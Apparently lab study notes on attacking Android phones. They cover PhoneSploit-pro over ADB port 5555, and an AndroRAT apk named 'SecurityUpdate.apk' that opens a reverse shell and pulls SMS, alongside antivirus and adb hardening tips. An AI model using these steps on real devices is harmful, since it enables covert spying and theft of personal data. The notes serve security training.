# Hacking Mobile Platform

### Exploit Android Platform through ADB

tool used
#### [[Phonesploit-pro]]

now generally ADB is connected via a USB cable 
But its also possible to do this without a cable
by enabling a __daemon server at TCP 5555__

```bash
cd PhoneSploit-pro
```

```bash
python3 phonesploitpro.py
```

→ press `y`to any prompts, main menu screen shows up
→ press `1` to connect to a device and enter the IP address of the Android device
→ connection established on port 5555 *if not, start again*
→ press `6` to take a screenshot and enter the location where to save the file *here /home/attacker*
→ press `13`and then `2` to list all the installed apps
> we can use this info to launch or uninstall any installed apps

→ press `10` to run an app
→ press `14`to get a shell on the device
> → try `pwd` etc. etc. move around like a linux machine `cd` `ls`

sometimes we need to view of download or view or file
so we need to choose options like:
- **Copy All Camera Photos**
- **Copy All Screenshots**
- **Copy All App Data**
- **List All Folders/Files**
- **Open a Link on Device**

→ try various options and have a look around

---
### Hack by creating an apk file 

tool used
#### [[AndroRAT]]

```bash
cd AndroRat
```

```bash
python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
```
> --build = used for building apk
> -i = specifies the local IP *here 10.10.1.13*
> -p = specifies the port no *here 4444*
> -o = specifies the name of the output apk file

→ file will be generated in the location where the python script was located *here /home/attacker/AndroRAT/*

→ this is our RAT that we need to transfer to the victim's device


→ now we start a listener 
```bash
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
```
> --shell = used to get an interpreter shell
> -i = specify the ip address for listening *here 0.0.0.0 (listening on all)*
> -p = port number *here 4444*

→ androrat listener will start and will show **Waiting for Connection**
→ now we need to transfer the apk file to the victim mobile.
→ as soon as the victim installs the apk, we'll get a meterpreter shell
→ enter `help` to view the commands available

→ `deviceinfo` to view device related information
→ `getSMS inbox` to obtain the file containing SMSes from the inbox of a victim device
> these files get stored in `home/attacker/AndroRAT/Dumps`

→ `getMACAddress` to view MAC details on the victim device

#### other tools
- hxp_photo_eye
- Gallery Eye
- mSpy - https://www.mspy.com
- Hackingtoolkit 

---
## Secure Android Device

### From malicious Apps

tool used
#### AVG Antivirus

→ open AVG Antiviurs
→ `START SCAN`
→ `Resolve` issues that appear
→ it may detect the malicious file from the last lab, resolve that issue and it deletes the file
→ uninstall what's suggested

#### other tools
- Certo: Anti Spyware & Security
- Anti Spy Detector - Spyware
- iAmNotified - Anti Spy System
- Anti Spy - https://www.proctectstar.com
- Secury - Anti Spy Security


#### ADB 

it is another cli tool
or in another words the bridge that is used by [[Phonesploit-pro]] to access the android device
or a cli tool that lets one connect to an android device
to connect the device a USB wire is required
but it works over a Wi-Fi

to list the devices in a network that have port 5555 open
port 5555 is default port for adb
```bash
nmap -p 5555 <ip-range>
```
> -p = specifying the port *here 5555*

→ list connected devices
```bash
adb devices
```

→ connect over a wi-fi
```bash
adb connect <ip>:5555
```

→ open a shell to the android device
```bash
adb shell
```
> once connected and we have shell we can move around the device like a normal linux device
> as android is linux based

→ copy a file from phone to PC
```bash
adb pull <file-location>
```

→ copy a file from PC to phone
```bash
adb push <filename> <location>
```

→ reboot the device
```bash
adb reboot
```


---